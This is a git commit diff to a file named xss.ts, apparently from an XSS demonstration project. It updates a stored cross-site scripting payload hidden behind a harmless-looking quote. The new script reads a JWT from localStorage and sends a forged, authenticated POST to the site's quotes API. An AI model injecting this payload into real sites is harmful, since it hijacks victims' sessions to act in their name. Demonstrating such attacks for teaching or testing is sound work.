c5bb5b6164408582b6ac9a24276ec44d21019228
Bishram <m.bishram.yashir@gmail.com>
2022-07-07 10:22:52 +0800

    Update xss script

--- src/libs/attacks/xss.ts
+++ src/libs/attacks/xss.ts
@@ -1,11 +1,19 @@
 export const XSS_SCRIPT = `Seemingly harmless quote! Lorem ipsum dolor sit amet, consectetur adipisicing elit. Fugit, quasi.
 <script>
-  fetch("/api/quotes", {
-      method: "POST",
-      body: JSON.stringify({
-        bgColor: "bg-purple-600",
-        name: "XSS",
-        quote: "XSS Attack! Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ad aliquid aperiam beatae corporis delectus, dolorum inventore nihil quas quod rem sapiente suscipit velit! Commodi, cupiditate ipsa itaque magnam maxime quam?",
-      }),
-    }).then((res) => console.log(res.json()));
+	// Get token from localStorage
+  const token = localStorage.getItem("JWT_ACCESS_TOKEN_KEY");
+  
+  // Still fetch if not found, it will try to use cookies
+	fetch("/api/quotes", {
+		method: "POST",
+		body: JSON.stringify({
+			bgColor: "bg-purple-600",
+			name: "XSS",
+			quote:
+				"XSS Attack! Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ad aliquid aperiam beatae corporis delectus, dolorum inventore nihil quas quod rem sapiente suscipit velit! Commodi, cupiditate ipsa itaque magnam maxime quam?",
+		}),
+		headers: {
+			authorization: token && "Bearer " + token,
+		},
+	}).then((res) => console.log(res.json()));
 </script>`;
